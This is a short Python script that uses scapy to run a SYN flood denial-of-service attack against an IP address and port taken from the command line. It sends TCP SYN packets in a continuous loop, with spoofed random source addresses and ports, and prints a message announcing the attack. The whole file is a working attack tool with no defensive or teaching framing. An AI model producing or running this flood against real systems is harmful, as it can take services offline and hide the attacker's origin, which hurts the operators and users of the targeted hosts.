from scapy.all import *
import threading
import time
logging.getLogger("scapy.runtime").setLevel(logging.ERROR)

address = str(sys.argv[1])
port = int(sys.argv[2])

print("Performing a SYN flood attack on " + address)

def syn_flood():
    packet = IP(dst=address, src=RandIP())/TCP(sport=RandShort(), dport=port, flags="S")
    try:
        send(packet, loop=True, inter=0.000005)
    except KeyboardInterrupt:
        print("Attacck interrupted")

syn_flood()